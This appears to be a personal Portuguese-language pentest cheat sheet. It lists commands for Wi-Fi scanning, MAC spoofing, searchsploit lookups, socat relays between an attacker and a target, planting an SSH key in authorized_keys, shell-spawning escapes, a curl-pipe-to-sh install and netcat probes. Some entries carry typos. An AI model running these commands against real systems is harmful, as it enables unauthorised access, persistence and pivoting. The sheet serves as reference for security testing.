# Comandos Linux
-------
- script -a -f pentest.log
- exit
---------
# Wifi no terminal

- sudo iwconfig  // dispositivos wifi
- sudo iwlist wlan0 scan  // listando redes wifi 
- sudo iwlist wllan0 scan | grep ESSID  // listando redes wifi, filtrando apenas nomes
- nmcli d wifi connect SSIDredeWifi password suasenha // conecta na rede wifi

- macchanger -r eth0
- macchanger -p eth0
- macchanger -m mac eth0

- ipcalc 192.168.1.1/255.255.255.0
-------------
- searchsploit "ipfire" --exclude="algum|outra"
- searchsploit -e "ipfire"
- searchsploit "ipfire" --id
- searchsploit "ipfire" --id -m 44433
- searchsploit "ipfire" -m 44433.py
-------------
- socat TCP-LISTEN:8443,reuseaddr,fork TCP-LISTEN:2222,reuseaddr    #ouvindo atacante
- socat TCP4:172.20.1.6:8443 TCP4:127.0.0.1:22                      #maquina alvo
-----------
- ssh-keygen -f minhachave #criando chave publica ssh
- mkdir ~www-data
- mkdir ~/.ssh/
- touch ~/.ssh/authorized_keys
- echo "key ssh-rsa" > ~/.ssh/authorized_keys
- -----------------
# Shell Spawning

- python -c 'import pty; pty.spawn("/bin/sh")'
- echo os.system('/bin/bash')
- /bin/sh -i
- perl —e 'exec "/bin/sh";'
- perl: exec "/bin/sh";
- ruby: exec "/bin/sh"
- lua: os.execute('/bin/sh')
- (From within IRB)
- exec "/bin/sh"
- (From within vi)
- :!bash
- (From within vi)
- :set shell=/bin/bash:shell
- (From within nmap)
- !she
---------------
- curl -s -I dominio.com
- curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk dominio.com
- curl -L https://npmjs.org/install.sh | sh
- 

- hping --sync -c 1 -p 8081 172.16.1.5
- nc -vn -p 53 172.16.1.5 8180
- nc -vn -p 53 172.16.1.5 8180 > arquivo.html
- GET / HTTP/1.0
